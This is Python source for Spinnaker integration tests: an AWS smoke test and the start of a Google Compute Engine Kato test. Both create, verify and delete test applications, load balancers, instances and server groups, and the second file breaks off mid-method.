#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

""""""
Smoke test to see if Spinnaker can interoperate with Amazon Web Services.

See testable_service/integration_test.py and spinnaker_testing/spinnaker.py
for more details.

The smoke test will use ssh to peek at the spinnaker configuration
to determine the managed project it should verify, and to determine
the spinnaker account name to use when sending it commands.

Sample Usage:
    Assuming you have created $PASSPHRASE_FILE (which you should chmod 400)
    and $CITEST_ROOT points to the root directory of this repository
    (which is . if you execute this from the root)

  PYTHONPATH=$CITEST_ROOT:$CITEST_ROOT/spinnaker \
    python $CITEST_ROOT/spinnaker/spinnaker_system/smoke_test.py \
    --gce_ssh_passphrase_file=$PASSPHRASE_FILE \
    --gce_project=$PROJECT \
    --gce_zone=$ZONE \
    --gce_instance=$INSTANCE
    --test_aws_zone=$AWS_ZONE \
    --aws_profile=$AWS_PROFILE
or
  PYTHONPATH=$CITEST_ROOT:$CITEST_ROOT/spinnaker \
    python $CITEST_ROOT/spinnaker/spinnaker_system/smoke_test.py \
    --native_hostname=host-running-smoke-test
    --test_aws_zone=$AWS_ZONE \
    --aws_profile=$AWS_PROFILE

  Note that the $AWS_ZONE is not directly used, rather it is a standard
  parameter being used to infer the region. The test is going to pick
  some different availability zones within the region in order to test kato.
  These are currently hardcoded in.
""""""

# Standard python modules.
import sys

# citest modules.
import citest.aws_testing as aws
import citest.json_contract as jc
import citest.json_predicate as jp
import citest.service_testing as st

# Spinnaker modules.
import spinnaker_testing as sk
import spinnaker_testing.gate as gate


class AwsSmokeTestScenario(sk.SpinnakerTestScenario):
  """"""Defines the scenario for the smoke test.

  This scenario defines the different test operations.
  We're going to:
    Create a Spinnaker Application
    Create a Load Balancer
    Create a Server Group
    Delete each of the above (in reverse order)
  """"""

  @classmethod
  def new_agent(cls, bindings):
    """"""Implements citest.service_testing.AgentTestScenario.new_agent.""""""
    return gate.new_agent(bindings)

  @classmethod
  def initArgumentParser(cls, parser, defaults=None):
    """"""Initialize command line argument parser.

    Args:
      parser: argparse.ArgumentParser
    """"""
    super(AwsSmokeTestScenario, cls).initArgumentParser(parser,
                                                        defaults=defaults)

    defaults = defaults or {}
    parser.add_argument(
        '--test_component_detail',
        default='fe',
        help='Refinement for component name to create.')

  def __init__(self, bindings, agent=None):
    """"""Constructor.

    Args:
      bindings: [dict] The data bindings to use to configure the scenario.
      agent: [GateAgent] The agent for invoking the test operations on Gate.
    """"""
    super(AwsSmokeTestScenario, self).__init__(bindings, agent)

    bindings = self.bindings
    bindings['TEST_APP_COMPONENT_NAME'] = (
        '{app}-{stack}-{detail}'.format(
            app=bindings['TEST_APP'],
            stack=bindings['TEST_STACK'],
            detail=bindings['TEST_COMPONENT_DETAIL']))

    # We'll call out the app name because it is widely used
    # because it scopes the context of our activities.
    # pylint: disable=invalid-name
    self.TEST_APP = bindings['TEST_APP']

  def create_app(self):
    """"""Creates OperationContract that creates a new Spinnaker Application.""""""
    contract = jc.Contract()
    return st.OperationContract(
        self.agent.make_create_app_operation(
            bindings=self.bindings, application=self.TEST_APP),
        contract=contract)

  def delete_app(self):
    """"""Creates OperationContract that deletes a new Spinnaker Application.""""""
    contract = jc.Contract()
    return st.OperationContract(
        self.agent.make_delete_app_operation(
            bindings=self.bindings, application=self.TEST_APP),
        contract=contract)

  def upsert_load_balancer(self, use_vpc):
    """"""Creates OperationContract for upsertLoadBalancer.

    Calls Spinnaker's upsertLoadBalancer with a configuration, then verifies
    that the expected resources and configurations are visible on AWS. See
    the contract builder for more info on what the expectations are.

    Args:
      use_vpc: [bool] if True configure a VPC otherwise dont.
    """"""
    bindings = self.bindings
    load_balancer_name = bindings['TEST_APP_COMPONENT_NAME']

    # We're assuming that the given region has 'A' and 'B' availability
    # zones. This seems conservative but might be brittle since we permit
    # any region.
    region = bindings['TEST_AWS_REGION']
    avail_zones = [region + 'a', region + 'b']

    if use_vpc:
      # TODO(ewiseblatt): 20160301
      # We're hardcoding the VPC here, but not sure which we really want.
      # I think this comes from the spinnaker.io installation instructions.
      # What's interesting about this is that it is a 10.* CidrBlock,
      # as opposed to the others, which are public IPs. All this is sensitive
      # as to where the TEST_AWS_VPC_ID came from so this is going to be
      # brittle. Ideally we only need to know the vpc_id and can figure the
      # rest out based on what we have available.
      subnet_type = 'internal (defaultvpc)'
      vpc_id = bindings['TEST_AWS_VPC_ID']

      # Not really sure how to determine this value in general.
      security_groups = ['default']

      # The resulting load balancer will only be available in the zone of
      # the subnet we are using. We'll figure that out by looking up the
      # subnet we want.
      subnet_details = self.aws_observer.get_resource_list(
          root_key='Subnets',
          aws_command='describe-subnets',
          aws_module='ec2',
          args=['--filters',
                'Name=vpc-id,Values={vpc_id}'
                ',Name=tag:Name,Values=defaultvpc.internal.{region}'
                .format(vpc_id=vpc_id, region=region)])
      try:
        expect_avail_zones = [subnet_details[0]['AvailabilityZone']]
      except KeyError:
        raise ValueError('vpc_id={0} appears to be unknown'.format(vpc_id))
    else:
      subnet_type = """"
      vpc_id = None
      security_groups = None
      expect_avail_zones = avail_zones

      # This will be a second load balancer not used in other tests.
      # Decorate the name so as not to confuse it.
      load_balancer_name += '-pub'


    listener = {
        'Listener': {
            'InstancePort':80,
            'LoadBalancerPort':80
        }
    }
    health_check = {
        'HealthyThreshold': 8,
        'UnhealthyThreshold': 3,
        'Interval': 12,
        'Timeout': 6,
        'Target':'HTTP:%d/' % listener['Listener']['InstancePort']
    }

    payload = self.agent.make_json_payload_from_kwargs(
        job=[{
            'type': 'upsertLoadBalancer',
            'cloudProvider': 'aws',
            # 'loadBalancerName': load_balancer_name,


            'credentials': bindings['AWS_CREDENTIALS'],
            'name': load_balancer_name,
            'stack': bindings['TEST_STACK'],
            'detail': '',
            'region': bindings['TEST_AWS_REGION'],

            'availabilityZones': {region: avail_zones},
            'regionZones': avail_zones,
            'listeners': [{
                'internalProtocol': 'HTTP',
                'internalPort': listener['Listener']['InstancePort'],
                'externalProtocol': 'HTTP',
                'externalPort': listener['Listener']['LoadBalancerPort']
            }],
            'healthCheck': health_check['Target'],
            'healthCheckProtocol': 'HTTP',
            'healthCheckPort': listener['Listener']['LoadBalancerPort'],
            'healthCheckPath': '/',
            'healthTimeout': health_check['Timeout'],
            'healthInterval': health_check['Interval'],
            'healthyThreshold': health_check['HealthyThreshold'],
            'unhealthyThreshold': health_check['UnhealthyThreshold'],

            'user': '[anonymous]',
            'usePreferredZones': True,
            'vpcId': vpc_id,
            'subnetType': subnet_type,
            # If I set security group to this then I get an error it is missing.
            # bindings['TEST_AWS_SECURITY_GROUP_ID']],
            'securityGroups': security_groups
        }],
        description='Create Load Balancer: ' + load_balancer_name,
        application=self.TEST_APP)

    builder = aws.AwsContractBuilder(self.aws_observer)
    (builder.new_clause_builder('Load Balancer Added', retryable_for_secs=10)
     .collect_resources(
         aws_module='elb',
         command='describe-load-balancers',
         args=['--load-balancer-names', load_balancer_name])
     .contains_pred_list([
         jp.PathContainsPredicate(
             'LoadBalancerDescriptions/HealthCheck', health_check),
         jp.PathPredicate(
             'LoadBalancerDescriptions/AvailabilityZones{0}'.format(
                 jp.DONT_ENUMERATE_TERMINAL),
             jp.LIST_SIMILAR(expect_avail_zones)),
         jp.PathElementsContainPredicate(
             'LoadBalancerDescriptions/ListenerDescriptions', listener)
         ])
    )

    title_decorator = '_with_vpc' if use_vpc else '_without_vpc'
    return st.OperationContract(
        self.new_post_operation(
            title='upsert_load_balancer' + title_decorator,
            data=payload,
            path='tasks'),
        contract=builder.build())

  def delete_load_balancer(self, use_vpc):
    """"""Creates OperationContract for deleteLoadBalancer.

    To verify the operation, we just check that the AWS resources
    created by upsert_load_balancer are no longer visible on AWS.

    Args:
      use_vpc: [bool] if True delete the VPC load balancer, otherwise
         the non-VPC load balancer.
    """"""
    load_balancer_name = self.bindings['TEST_APP_COMPONENT_NAME']
    if not use_vpc:
      # This is the second load balancer, where we decorated the name in upsert.
      load_balancer_name += '-pub'

    payload = self.agent.make_json_payload_from_kwargs(
        job=[{
            'type': 'deleteLoadBalancer',
            'cloudProvider': 'aws',

            'credentials': self.bindings['AWS_CREDENTIALS'],
            'regions': [self.bindings['TEST_AWS_REGION']],
            'loadBalancerName': load_balancer_name
        }],
        description='Delete Load Balancer: {0} in {1}:{2}'.format(
            load_balancer_name,
            self.bindings['AWS_CREDENTIALS'],
            self.bindings['TEST_AWS_REGION']),
        application=self.TEST_APP)

    builder = aws.AwsContractBuilder(self.aws_observer)
    (builder.new_clause_builder('Load Balancer Removed')
     .collect_resources(
         aws_module='elb',
         command='describe-load-balancers',
         args=['--load-balancer-names', load_balancer_name],
         no_resources_ok=True)
     .excludes_path_value('LoadBalancerName', load_balancer_name))

    title_decorator = '_with_vpc' if use_vpc else '_without_vpc'
    return st.OperationContract(
        self.new_post_operation(
            title='delete_load_balancer' + title_decorator,
            data=payload,
            path='tasks'),
        contract=builder.build())

  def create_server_group(self):
    """"""Creates OperationContract for createServerGroup.

    To verify the operation, we just check that the AWS Auto Scaling Group
    for the server group was created.
    """"""
    bindings = self.bindings
    load_balancer_name = bindings['TEST_APP_COMPONENT_NAME']

    # Spinnaker determines the group name created,
    # which will be the following:
    group_name = '{app}-{stack}-v000'.format(
        app=self.TEST_APP, stack=bindings['TEST_STACK'])

    region = bindings['TEST_AWS_REGION']
    avail_zones = [region + 'a', region + 'b']

    payload = self.agent.make_json_payload_from_kwargs(
        job=[{
            'type': 'createServerGroup',
            'cloudProvider': 'aws',
            'application': self.TEST_APP,
            'credentials': bindings['AWS_CREDENTIALS'],
            'strategy':'',
            'capacity': {'min':2, 'max':2, 'desired':2},
            'targetHealthyDeployPercentage': 100,
            'loadBalancers': [load_balancer_name],
            'cooldown': 8,
            'healthCheckType': 'EC2',
            'healthCheckGracePeriod': 40,
            'instanceMonitoring': False,
            'ebsOptimized': False,
            'iamRole': bindings['AWS_IAM_ROLE'],
            'terminationPolicies': ['Default'],

            'availabilityZones': {region: avail_zones},
            'keyPair': bindings['AWS_CREDENTIALS'] + '-keypair',
            'suspendedProcesses': [],
            # TODO(ewiseblatt): Inquiring about how this value is determined.
            # It seems to be the ""Name"" tag value of one of the VPCs
            # but is not the default VPC, which is what we using as the VPC_ID.
            # So I suspect something is out of whack. This name comes from
            # spinnaker.io tutorial. But using the default vpc would probably
            # be more adaptive to the particular deployment.
            'subnetType': 'internal (defaultvpc)',
            'securityGroups': [bindings['TEST_AWS_SECURITY_GROUP_ID']],
            'virtualizationType': 'paravirtual',
            'stack': bindings['TEST_STACK'],
            'freeFormDetails': '',
            'amiName': bindings['TEST_AWS_AMI'],
            'instanceType': 'm1.small',
            'useSourceCapacity': False,
            'account': bindings['AWS_CREDENTIALS'],
            'user': '[anonymous]'
        }],
        description='Create Server Group in ' + group_name,
        application=self.TEST_APP)

    builder = aws.AwsContractBuilder(self.aws_observer)
    (builder.new_clause_builder('Auto Server Group Added',
                                retryable_for_secs=30)
     .collect_resources('autoscaling', 'describe-auto-scaling-groups',
                        args=['--auto-scaling-group-names', group_name])
     .contains_path_value('AutoScalingGroups', {'MaxSize': 2}))

    return st.OperationContract(
        self.new_post_operation(
            title='create_server_group', data=payload, path='tasks'),
        contract=builder.build())

  def delete_server_group(self):
    """"""Creates OperationContract for deleteServerGroup.

    To verify the operation, we just check that the AWS Auto Scaling Group
    is no longer visible on AWS (or is in the process of terminating).
    """"""
    bindings = self.bindings
    group_name = '{app}-{stack}-v000'.format(
        app=self.TEST_APP, stack=bindings['TEST_STACK'])

    payload = self.agent.make_json_payload_from_kwargs(
        job=[{
            'cloudProvider': 'aws',
            'type': 'destroyServerGroup',
            'serverGroupName': group_name,
            'asgName': group_name,
            'region': bindings['TEST_AWS_REGION'],
            'regions': [bindings['TEST_AWS_REGION']],
            'credentials': bindings['AWS_CREDENTIALS'],
            'user': '[anonymous]'
        }],
        application=self.TEST_APP,
        description='DestroyServerGroup: ' + group_name)

    builder = aws.AwsContractBuilder(self.aws_observer)
    (builder.new_clause_builder('Auto Scaling Group Removed')
     .collect_resources('autoscaling', 'describe-auto-scaling-groups',
                        args=['--auto-scaling-group-names', group_name],
                        no_resources_ok=True)
     .contains_path_value('AutoScalingGroups', {'MaxSize': 0}))

    (builder.new_clause_builder('Instances Are Removed',
                                retryable_for_secs=30)
     .collect_resources('ec2', 'describe-instances', no_resources_ok=True)
     .excludes_path_value('name', group_name))

    return st.OperationContract(
        self.new_post_operation(
            title='delete_server_group', data=payload, path='tasks'),
        contract=builder.build())


class AwsSmokeTest(st.AgentTestCase):
  """"""The test fixture for the SmokeTest.

  This is implemented using citest OperationContract instances that are
  created by the AwsSmokeTestScenario.
  """"""
  # pylint: disable=missing-docstring

  def test_a_create_app(self):
    self.run_test_case(self.scenario.create_app())

  def test_b_upsert_load_balancer_public(self):
    self.run_test_case(self.scenario.upsert_load_balancer(use_vpc=False))

  def test_b_upsert_load_balancer_vpc(self):
    self.run_test_case(self.scenario.upsert_load_balancer(use_vpc=True))

  def test_c_create_server_group(self):
    # We'll permit this to timeout for now
    # because it might be waiting on confirmation
    # but we'll continue anyway because side effects
    # should have still taken place.
    self.run_test_case(self.scenario.create_server_group(), timeout_ok=True)

  def test_x_delete_server_group(self):
    self.run_test_case(self.scenario.delete_server_group(), max_retries=5)

  def test_y_delete_load_balancer_vpc(self):
    self.run_test_case(self.scenario.delete_load_balancer(use_vpc=True),
                       max_retries=5)

  def test_y_delete_load_balancer_pub(self):
    self.run_test_case(self.scenario.delete_load_balancer(use_vpc=False),
                       max_retries=5)

  def test_z_delete_app(self):
    # Give a total of a minute because it might also need
    # an internal cache update
    self.run_test_case(self.scenario.delete_app(),
                       retry_interval_secs=8, max_retries=8)


def main():
  """"""Implements the main method running this smoke test.""""""

  defaults = {
      'TEST_STACK': str(AwsSmokeTestScenario.DEFAULT_TEST_ID),
      'TEST_APP': 'smoketest' + AwsSmokeTestScenario.DEFAULT_TEST_ID
  }

  return st.ScenarioTestRunner.main(
      AwsSmokeTestScenario,
      default_binding_overrides=defaults,
      test_case_list=[AwsSmokeTest])


if __name__ == '__main__':
  sys.exit(main())
/n/n/nspinnaker_system/google_kato_test.py/n/n# Copyright 2015 Google Inc. All Rights Reserved.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.


# See testable_service/integration_test.py and spinnaker_testing/spinnaker.py
# for more details.
#
# The kato test will use ssh to peek at the spinnaker configuration
# to determine the managed project it should verify, and to determine
# the spinnaker account name to use when sending it commands.
#
# Sample Usage:
#     Assuming you have created $PASSPHRASE_FILE (which you should chmod 400):
#     and $CITEST_ROOT points to the root directory of this repository
#     (which is . if you execute this from the root)
#
#   PYTHONPATH=$CITEST_ROOT:$CITEST_ROOT/spinnaker \
#     python $CITEST_ROOT/spinnaker/spinnaker_system/google_kato_test.py \
#     --gce_ssh_passphrase_file=$PASSPHRASE_FILE \
#     --gce_project=$PROJECT \
#     --gce_zone=$ZONE \
#     --gce_instance=$INSTANCE
# or
#   PYTHONPATH=$CITEST_ROOT:$CITEST_ROOT/spinnaker \
#     python $CITEST_ROOT/spinnaker/spinnaker_system/google_kato_test.py \
#     --native_hostname=host-running-kato
#     --managed_gce_project=$PROJECT \
#     --test_gce_zone=$ZONE


# Standard python modules.
import json as json_module
import logging
import sys

# citest modules.
from citest.service_testing import HttpContractBuilder
from citest.service_testing import NoOpOperation
import citest.gcp_testing as gcp
import citest.json_predicate as jp
import citest.service_testing as st

# Spinnaker modules.
import spinnaker_testing as sk
import spinnaker_testing.kato as kato


class GoogleKatoTestScenario(sk.SpinnakerTestScenario):
  # _instance_names and _instance_zones will be set in create_instances_.
  # We're breaking them out so that they can be shared by other methods,
  # especially terminate.
  use_instance_names = []
  use_instance_zones = []
  __use_lb_name = ''     # The load balancer name.
  __use_lb_tp_name = ''  # The load balancer's target pool name.
  __use_lb_hc_name = ''  # The load balancer's health check name.
  __use_lb_target = ''   # The load balancer's 'target' resource.
  __use_http_lb_name = '' # The HTTP load balancer name.
  __use_http_lb_proxy_name = '' # The HTTP load balancer target proxy name.
  __use_http_lb_hc_name = '' # The HTTP load balancer health check name.
  __use_http_lb_bs_name = '' # The HTTP load balancer backend service name.
  __use_http_lb_fr_name = '' # The HTTP load balancer forwarding rule.
  __use_http_lb_map_name = '' # The HTTP load balancer url map name.
  __use_http_lb_http_proxy_name = '' # The HTTP load balancer target http proxy.

  @classmethod
  def new_agent(cls, bindings):
    """"""Implements the base class interface to create a new agent.

    This method is called by the base classes during setup/initialization.

    Args:
      bindings: The bindings dictionary with configuration information
        that this factory can draw from to initialize. If the factory would
        like additional custom bindings it could add them to initArgumentParser.

    Returns:
      A citest.service_testing.BaseAgent that can interact with Kato.
      This is the agent that test operations will be posted to.
    """"""
    return kato.new_agent(bindings)

  def create_instances(self):
    """"""Creates test adding instances to GCE.

     Create three instances.
       * The first two are of different types and zones, which
         we'll check. Future tests will also be using these
         from different zones (but same region).

       * The third is a duplicate in the same zone as another
         so we can check duplicate deletes (which limit one zone per call).

     We'll set the class properties use_instance_names and use_instance_zones
     so that they can be communicated to future tests to reference.

    Returns:
      st.OperationContract
    """"""
    # We're going to make specific instances so we can refer to them later
    # in tests involving instances. The instances are decorated to trace back
    # to this particular run so as not to conflict with other tests that may
    # be running.
    self.use_instance_names = [
        'katotest%sa' % self.test_id,
        'katotest%sb' % self.test_id,
        'katotest%sc' % self.test_id]

    # Put the instance in zones. Force one zone to be different
    # to ensure we're testing zone placement. We arent bothering
    # with different regions at this time.
    self.use_instance_zones = [
        self.bindings['TEST_GCE_ZONE'],
        'us-central1-b',
        self.bindings['TEST_GCE_ZONE']]
    if self.use_instance_zones[0] == self.use_instance_zones[1]:
      self.use_instance_zones[1] = 'us-central1-c'

    # Give the instances images and machine types. Again we're forcing
    # one to be different to ensure that we're using the values.
    image_name = [self.bindings['TEST_GCE_IMAGE_NAME'],
                  'debian-7-wheezy-v20150818',
                  self.bindings['TEST_GCE_IMAGE_NAME']]
    if image_name[0] == image_name[1]:
      image_name[1] = 'ubuntu-1404-trusty-v20150805'
    machine_type = ['f1-micro', 'g1-small', 'f1-micro']

    # The instance_spec will turn into the payload of instances we request.
    instance_spec = []
    builder = gcp.GceContractBuilder(self.gce_observer)
    for i in range(3):
      # pylint: disable=bad-continuation
      instance_spec.append(
        {
          'createGoogleInstanceDescription': {
            'instanceName': self.use_instance_names[i],
            'image': image_name[i],
            'instanceType': machine_type[i],
            'zone': self.use_instance_zones[i],
            'credentials': self.bindings['GCE_CREDENTIALS']
            }
        })

      # Verify we created an instance, whether or not it boots.
      (builder.new_clause_builder(
          'Instance %d Created' % i, retryable_for_secs=90)
            .list_resources('instances')
            .contains_path_value('name', self.use_instance_names[i]))
      if i < 2:
        # Verify the details are what we asked for.
        # Since we've finished the created clause, this already exists.
        # Note we're only checking the first two since they are different
        # from one another. Anything after that isnt necessary for the test.
        # The clause above already checked that they were all created so we
        # can assume from this test that the details are ok as well.
        (builder.new_clause_builder('Instance %d Details' % i)
            .inspect_resource('instances', self.use_instance_names[i],
                              extra_args=['--zone', self.use_instance_zones[i]])
            .contains_path_value('machineType', machine_type[i]))
        # Verify the instance eventually boots up.
        # We can combine this with above, but we'll probably need
        # to retry this, but not the above, so this way if the
        # above is broken (wrong), we wont retry thinking it isnt there yet.
        (builder.new_clause_builder('Instance %d Is Running' % i,
                             retryable_for_secs=90)
            .inspect_resource('instances', name=self.use_instance_names[i],
                              extra_args=['--zone', self.use_instance_zones[i]])
            .contains_path_eq('status', 'RUNNING'))

    payload = self.agent.make_json_payload_from_object(instance_spec)

    return st.OperationContract(
        self.new_post_operation(
            title='create_instances', data=payload, path='ops'),
        contract=builder.build())

  def terminate_instances(self, names, zone):
    """"""Creates test for removing specific instances.

    Args:
      names: A list of instance names to be removed.
      zone: The zone containing the instances.

    Returns:
      st.OperationContract
    """"""
    builder = gcp.GceContractBuilder(self.gce_observer)
    clause = (builder.new_clause_builder('Instances Deleted',
                                         retryable_for_secs=15,
                                         strict=True)
              .list_resources('instances'))
    for name in names:
      # If one of our instances still exists, it should be STOPPING.
      name_matches_pred = jp.PathContainsPredicate('name', name)
      is_stopping_pred = jp.PathEqPredicate('status', 'STOPPING')

      # We want the condition to apply to all the observed objects so we'll
      # map the constraint over the observation. Otherwise, if dont map it,
      # then we'd expect the constraint to hold somewhere among the observed
      # objects, but not necessarily all of them.
      clause.add_constraint(jp.IF(name_matches_pred, is_stopping_pred))

    # pylint: disable=bad-continuation
    payload = self.agent.type_to_payload(
          'terminateInstances',
          {
            'instanceIds': names,
            'zone': zone,
            'credentials': self.bindings['GCE_CREDENTIALS']
          })

    return st.OperationContract(
        self.new_post_operation(
            title='terminate_instances', data=payload, path='gce/ops'),
        contract=builder.build())

  def upsert_google_server_group_tags(self):
    # pylint: disable=bad-continuation
    server_group_name = 'katotest-server-group'
    payload = self.agent.type_to_payload(
        'upsertGoogleServerGroupTagsDescription',
        {
          'credentials': self.bindings['GCE_CREDENTIALS'],
          'zone': self.bindings['TEST_GCE_ZONE'],
          'serverGroupName': 'katotest-server-group',
          'tags': ['test-tag-1', 'test-tag-2']
        })

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Server Group Tags Added')
        .inspect_resource('managed-instance-groups', server_group_name)
        .contains_pred_list(
            [jp.PathContainsPredicate('name', server_group_name),
             jp.PathContainsPredicate(
                 ""tags/items"", ['test-tag-1', 'test-tag-2'])]))

    return st.OperationContract(
        self.new_post_operation(
            title='upsert_server_group_tags', data=payload, path='ops'),
        contract=builder.build())

  def create_http_load_balancer(self):
    logical_http_lb_name = 'katotest-httplb-' + self.test_id
    self.__use_http_lb_name = logical_http_lb_name

    # TODO(ewiseblatt): 20150530
    # This needs to be abbreviated to hc.
    self.__use_http_lb_hc_name = logical_http_lb_name + '-health-check'

    # TODO(ewiseblatt): 20150530
    # This needs to be abbreviated to bs.
    self.__use_http_lb_bs_name = logical_http_lb_name + '-backend-service'
    self.__use_http_lb_fr_name = logical_http_lb_name

    # TODO(ewiseblatt): 20150530
    # This should be abbreviated (um?).
    self.__use_http_lb_map_name = logical_http_lb_name + '-url-map'

    # TODO(ewiseblatt): 20150530
    # This should be abbreviated (px)?.
    self.__use_http_lb_proxy_name = logical_http_lb_name + '-target-http-proxy'

    interval = 231
    healthy = 8
    unhealthy = 9
    timeout = 65
    path = '/hello/world'

    # TODO(ewiseblatt): 20150530
    # This field might be broken. 123-456 still resolves to 80-80
    # Changing it for now so the test passes.
    port_range = ""80-80""

    # TODO(ewiseblatt): 20150530
    # Specify explicit backends?

    health_check = {
        'checkIntervalSec': interval,
        'healthyThreshold': healthy,
        'unhealthyThreshold': unhealthy,
        'timeoutSec': timeout,
        'requestPath': path
        }

    # pylint: disable=bad-continuation
    payload = self.agent.type_to_payload(
        'createGoogleHttpLoadBalancerDescription',
        {
          'healthCheck': health_check,
          'portRange': port_range,
          'loadBalancerName': logical_http_lb_name,
          'credentials': self.bindings['GCE_CREDENTIALS']
        })

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Http Health Check Added')
        .list_resources('http-health-checks')
        .contains_pred_list(
            [jp.PathContainsPredicate('name', self.__use_http_lb_hc_name),
             jp.PathContainsPredicate(None, health_check)]))
    (builder.new_clause_builder('Forwarding Rule Added', retryable_for_secs=15)
       .list_resources('forwarding-rules')
       .contains_pred_list(
           [jp.PathContainsPredicate('name', self.__use_http_lb_fr_name),
            jp.PathContainsPredicate('portRange', port_range)]))
    (builder.new_clause_builder('Backend Service Added')
       .list_resources('backend-services')
       .contains_pred_list(
           [jp.PathContainsPredicate('name', self.__use_http_lb_bs_name),
            jp.PathElementsContainPredicate(
                'healthChecks', self.__use_http_lb_hc_name)]))
    (builder.new_clause_builder('Url Map Added')
       .list_resources('url-maps')
       .contains_pred_list(
           [jp.PathContainsPredicate('name', self.__use_http_lb_map_name),
            jp.PathContainsPredicate(
                'defaultService', self.__use_http_lb_bs_name)]))
    (builder.new_clause_builder('Target Http Proxy Added')
       .list_resources('target-http-proxies')
       .contains_pred_list(
           [jp.PathContainsPredicate('name', self.__use_http_lb_proxy_name),
            jp.PathContainsPredicate('urlMap', self.__use_http_lb_map_name)]))

    return st.OperationContract(
        self.new_post_operation(
            title='create_http_load_balancer', data=payload, path='ops'),
        contract=builder.build())

  def delete_http_load_balancer(self):
    # pylint: disable=bad-continuation
    payload = self.agent.type_to_payload(
        'deleteGoogleHttpLoadBalancerDescription',
        {
          'loadBalancerName': self.__use_http_lb_name,
          'credentials': self.bindings['GCE_CREDENTIALS']
        })

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Health Check Removed')
       .list_resources('http-health-checks')
       .excludes_path_value('name', self.__use_http_lb_hc_name))
    (builder.new_clause_builder('Forwarding Rules Removed')
       .list_resources('forwarding-rules')
       .excludes_path_value('name', self.__use_http_lb_fr_name))
    (builder.new_clause_builder('Backend Service Removed')
       .list_resources('backend-services')
       .excludes_path_value('name', self.__use_http_lb_bs_name))
    (builder.new_clause_builder('Url Map Removed')
       .list_resources('url-maps')
       .excludes_path_value('name', self.__use_http_lb_map_name))
    (builder.new_clause_builder('Target Http Proxy Removed')
       .list_resources('target-http-proxies')
       .excludes_path_value('name', self.__use_http_lb_proxy_name))

    return st.OperationContract(
        self.new_post_operation(
            title='delete_http_load_balancer', data=payload, path='ops'),
        contract=builder.build())


  def upsert_load_balancer(self):
    self.__use_lb_name = 'katotest-lb-' + self.test_id
    self.__use_lb_hc_name = '%s-hc' % self.__use_lb_name
    self.__use_lb_tp_name = '%s-tp' % self.__use_lb_name
    self.__use_lb_target = '{0}/targetPools/{1}'.format(
        self.bindings['TEST_GCE_REGION'], self.__use_lb_tp_name)

    interval = 123
    healthy = 4
    unhealthy = 5
    timeout = 78
    path = '/' + self.__use_lb_target

    health_check = {
        'checkIntervalSec': interval,
        'healthyThreshold': healthy,
        'unhealthyThreshold': unhealthy,
        'timeoutSec': timeout,
        'requestPath': path
        }

    # pylint: disable=bad-continuation
    payload = self.agent.type_to_payload(
        'upsertGoogleLoadBalancerDescription',
        {
          'healthCheck': health_check,
          'region': self.bindings['TEST_GCE_REGION'],
          'credentials': self.bindings['GCE_CREDENTIALS'],
          'loadBalancerName': self.__use_lb_name
        })

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Forwarding Rules Added',
                                retryable_for_secs=30)
       .list_resources('forwarding-rules')
       .contains_path_value('name', self.__use_lb_name)
       .contains_path_value('target', self.__use_lb_target))
    (builder.new_clause_builder('Target Pool Added', retryable_for_secs=15)
       .list_resources('target-pools')
       .contains_path_value('name', self.__use_lb_tp_name))

     # We list the resources here because the name isnt exact
     # and the list also returns the details we need.
    (builder.new_clause_builder('Health Check Added', retryable_for_secs=15)
       .list_resources('http-health-checks')
       .contains_pred_list(
           [jp.PathContainsPredicate('name', self.__use_lb_hc_name),
            jp.PathContainsPredicate(None, health_check)]))

    return st.OperationContract(
      self.new_post_operation(
          title='upsert_load_balancer', data=payload, path='ops'),
      contract=builder.build())

  def delete_load_balancer(self):
    # pylint: disable=bad-continuation
    payload = self.agent.type_to_payload(
        'deleteGoogleLoadBalancerDescription',
        {
          'region': self.bindings['TEST_GCE_REGION'],
          'credentials': self.bindings['GCE_CREDENTIALS'],
          'loadBalancerName': self.__use_lb_name
        })

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Health Check Removed')
       .list_resources('http-health-checks')
       .excludes_path_value('name', self.__use_lb_hc_name))
    (builder.new_clause_builder('Target Pool Removed')
       .list_resources('target-pools')
       .excludes_path_value('name', self.__use_lb_tp_name))
    (builder.new_clause_builder('Forwarding Rule Removed')
       .list_resources('forwarding-rules')
       .excludes_path_value('name', self.__use_lb_name))

    return st.OperationContract(
      self.new_post_operation(
          title='delete_load_balancer', data=payload, path='ops'),
      contract=builder.build())

  def register_load_balancer_instances(self):
    """"""Creates test registering the first two instances with a load balancer.

       Assumes that create_instances test has been run to add
       the instances. Note by design these were in two different zones
       but same region as required by the API this is testing.

       Assumes that upsert_load_balancer has been run to
       create the load balancer itself.
    Returns:
      st.OperationContract
    """"""
    # pylint: disable=bad-continuation
    payload = self.agent.type_to_payload(
        'registerInstancesWithGoogleLoadBalancerDescription',
        {
          'loadBalancerNames': [self.__use_lb_name],
          'instanceIds': self.use_instance_names[:2],
          'region': self.bindings['TEST_GCE_REGION'],
          'credentials': self.bindings['GCE_CREDENTIALS']
        })

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Instances in Target Pool',
                                retryable_for_secs=15)
       .list_resources('target-pools')
       .contains_pred_list(
          [jp.PathContainsPredicate('name', self.__use_lb_tp_name),
           jp.PathEqPredicate('region', self.bindings['TEST_GCE_REGION']),
           jp.PathElementsContainPredicate(
              'instances', self.use_instance_names[0]),
           jp.PathElementsContainPredicate(
              'instances', self.use_instance_names[1])])
       .excludes_pred_list(
           [jp.PathContainsPredicate('name', self.__use_lb_tp_name),
            jp.PathElementsContainPredicate(
                'instances', self.use_instance_names[2])]))

    return st.OperationContract(
      self.new_post_operation(
          title='register_load_balancer_instances', data=payload, path='ops'),
      contract=builder.build())


  def deregister_load_balancer_instances(self):
